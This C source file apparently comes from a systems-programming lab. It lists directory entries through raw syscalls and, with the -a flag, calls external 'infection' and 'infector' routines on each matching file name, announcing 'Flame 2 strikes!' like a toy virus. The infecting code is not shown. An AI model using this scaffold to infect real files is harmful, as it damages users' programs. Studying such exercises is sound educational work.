#include "util.h"

#define NULL 0

typedef int FILE;

#define stdin	0
#define stdout	1
#define stderr	2

#define O_RDONLY	00000000
#define O_WRONLY	00000001
#define O_RDWR		00000002
#define O_CREAT		00000100
#define O_TRUNC		00001000
#define O_APPEND	00002000
#define O_DIRECTORY	00200000

#define SYS_READ  3
#define SYS_WRITE 4
#define SYS_OPEN  5
#define SYS_CLOSE 6

typedef unsigned long SYS_CALL_ARG;
typedef int (*SYS_CALL_FUNC)(int cid, SYS_CALL_ARG arg0, SYS_CALL_ARG arg1, SYS_CALL_ARG arg2);
extern int system_call(int cid, SYS_CALL_ARG arg0, SYS_CALL_ARG arg1, SYS_CALL_ARG arg2);
SYS_CALL_FUNC sys_call = system_call;

int read(FILE fd, void *buf, int len) {
	return sys_call(SYS_READ, fd, (SYS_CALL_ARG)buf, len);
}

int write(FILE fd, void *buf, int len) {
	return sys_call(SYS_WRITE, fd, (SYS_CALL_ARG)buf, len);
}

int open(char *file_name, int flags, int mode) {
	return sys_call(SYS_OPEN, (SYS_CALL_ARG)file_name, flags, mode);
}

int close(FILE fd) {
	int ret = -1;
	if (fd != stdin && fd != stdout && fd != stderr) {
		ret = sys_call(SYS_CLOSE, fd, 0, 0);
	}

	return ret;
}

int read_c(FILE fd, char *pc) {
	return read(fd, pc, 1);
}

int write_c(FILE fd, char c) {
	return write(fd, &c, 1);
}
int write_s(FILE fd, char *s) {
	return write(fd, s, strlen(s));
}
int write_num(FILE fd, int num) {
	char *s = itoa(num);
	return write_s(fd, s);
}
int write_line(FILE fd) {
	return write_c(fd, '\n');
}

#define dbg_out stderr
int DebugMode = 0;

int dbg_print(void *buf, int len) {
	return system_call(SYS_WRITE, dbg_out, (SYS_CALL_ARG)buf, len);
}
int dbg_print_c(char c) {
	return dbg_print(&c, 1);
}
int dbg_print_s(char *s) {
	return dbg_print(s, strlen(s));
}
int dbg_print_num(int num) {
	char *s = itoa(num);
	return dbg_print_s(s);
}
int dbg_print_line() {
	return dbg_print_c('\n');
}

void dbg_print_system_call_info(int cid, SYS_CALL_ARG arg0, SYS_CALL_ARG arg1, SYS_CALL_ARG arg2, int ret) {
	dbg_print_s("SYS_CALL: ");
	dbg_print_s("cid=");
	dbg_print_num(cid);
	dbg_print_s(", arg0=");
	dbg_print_num(arg0);
	dbg_print_s(", arg1=");
	dbg_print_num(arg1);
	dbg_print_s(", arg2=");
	dbg_print_num(arg2);
	dbg_print_s(", ret=");
	dbg_print_num(ret);
	dbg_print_line();
}
int dbg_system_call(int cid, SYS_CALL_ARG arg0, SYS_CALL_ARG arg1, SYS_CALL_ARG arg2) {
	int ret = system_call(cid, arg0, arg1, arg2);
	dbg_print_system_call_info(cid, arg0, arg1, arg2, ret);
	return ret;
}

#define ARR_LEN(a) (sizeof((a)) / sizeof(*(a)))

#define SYS_GETDENTS 141
#define ERR_CODE 0x55

#define DT_UNKNOWN	0
#define DT_FIFO		1
#define DT_CHR		2
#define DT_DIR		4
#define DT_BLK		6
#define DT_REG		8
#define DT_LNK		10
#define DT_SOCK		12
#define DT_WHT		14

extern void infection(void);
extern void infector(char *);

int getdents(FILE fd, char *buf, int len) {
	return sys_call(SYS_GETDENTS, fd, (SYS_CALL_ARG)buf, len);
}

typedef struct linux_dirent {
	unsigned long  d_ino;     /* Inode number */
	unsigned long  d_off;     /* Offset to next linux_dirent */
	unsigned short d_reclen;  /* Length of this linux_dirent */
	char           d_name[];  /* Filename (null-terminated) */
						/* length is actually (d_reclen - 2 -
						offsetof(struct linux_dirent, d_name)) */
	/*
	char           pad;       // Zero padding byte
	char           d_type;    // File type (only since Linux
								// 2.6.4); offset is (d_reclen - 1)
	*/
} linux_dirent;
char linux_dirent_get_type(linux_dirent *d) {
	return *((char *)d + d->d_reclen - 1);
}
char* linux_dirent_get_name_of_type(char d_type) {
	return (d_type == DT_UNKNOWN)	? "Unknown" :
		   (d_type == DT_REG)		? "regular" :
		   (d_type == DT_DIR)		? "directory" :
		   (d_type == DT_FIFO)		? "FIFO" :
		   (d_type == DT_SOCK)		? "socket" :
		   (d_type == DT_LNK)		? "symlink" :
		   (d_type == DT_BLK)		? "block dev" :
		   (d_type == DT_CHR)		? "char dev" :
		   "???";
}

int task_do_dents_of_dir_file(FILE f_out, FILE fd_dir, char *prefix, int append) {
	char buf[8192];
	int nread = 0;
	int bpos = 0;
	linux_dirent *d;
	int err = 0;
	int prefix_len = 0;
	if (prefix) {
		prefix_len = strlen(prefix);
	}

	while (1) {
		nread = getdents(fd_dir, buf, ARR_LEN(buf));
		if (nread == 0) {
			/* End Of Dir */
			break;
		}
		else if (nread < 0) {
			err = nread;
			break;
		}

		for (bpos = 0; bpos < nread; bpos += d->d_reclen) {
			int selected = 0;
			char d_type = DT_UNKNOWN;
			d = (linux_dirent *)(buf + bpos);

			if (!prefix || strncmp(prefix, d->d_name, prefix_len) == 0) {
				selected = 1;
			}

			if (!selected) {
				continue;
			}

			d_type = linux_dirent_get_type(d);
			write_s(f_out, "'");
			write_s(f_out, d->d_name);
			write_s(f_out, "', ");
			write_s(f_out, linux_dirent_get_name_of_type(d_type));
			write_line(f_out);
			if (DebugMode) {
				dbg_print_s("length=");
				dbg_print_num(d->d_reclen);
				dbg_print_s(", name='");
				dbg_print_s(d->d_name);
				dbg_print_s("'");
				dbg_print_line();
			}

			if (append) {
				infection();
				infector(d->d_name);
			}
		}
	}

	return err;
}

int task_do_dents_of_dir(FILE f_out, char *dir, char *prefix, int append) {
	FILE fd_dir = -1;
	int err = 0;

	fd_dir = open(dir, O_RDONLY | O_DIRECTORY, 0);
	if (fd_dir < 0) {
		write_s(f_out, "Could not open the directory '");
		write_s(f_out, dir);
		write_s(f_out, "'");
		write_line(f_out);
		err = fd_dir;
	}
	else {
		err = task_do_dents_of_dir_file(f_out, fd_dir, prefix, append);
		close(fd_dir);
	}

	return err;
}

extern void code_start(void);
extern void code_end(void);

void print_label_addr(FILE f_out, char *lbl_name, void *p_lbl) {
	write_s(f_out, lbl_name);
	write_s(f_out, ": ");
	write_num(f_out, (int)p_lbl);
	write_line(f_out);
}

void print_code_lbl_addrs(FILE f_out) {
	print_label_addr(f_out, "code start", (void *)code_start);
	print_label_addr(f_out, "code end", (void *)code_end);
}

int main(int argc , char* argv[], char* envp[]) {
	int i = 0;
	int exit_code = 0;
	FILE f_in = stdin, f_out = stdout;
	char *prefix = NULL;
	int append = 0;

	for (i = 1; i < argc; ++i) {
		if (strncmp("-D", argv[i], 2) == 0) {
			DebugMode = 1;
			sys_call = dbg_system_call;
			break;
		}
	}

	for (i = 1; i < argc; ++i) {
		if (strncmp("-p", argv[i], 2) == 0) {
			if (prefix) {
				write_s(f_out, "Cannot use both '-p' and '-a' arguments");
				exit_code = 1;
				break;
			}
			else {
				prefix = argv[i] + 2;
				append = 0;
			}
		}
		else if (strncmp("-a", argv[i], 2) == 0) {
			if (prefix) {
				write_s(f_out, "Cannot use both '-p' and '-a' arguments");
				exit_code = 2;
				break;
			}
			else {
				prefix = argv[i] + 2;
				append = 1;
			}
		}
	}
	
	write_s(f_out, "Flame 2 strikes!\n");
	print_code_lbl_addrs(f_out);
	if (exit_code == 0) {
		exit_code = task_do_dents_of_dir(f_out, ".", prefix, append);
	}
	if (exit_code != 0) {
		exit_code = ERR_CODE;
	}

	close(f_in);
	close(f_out);
	close(dbg_out);
	return 0;
}
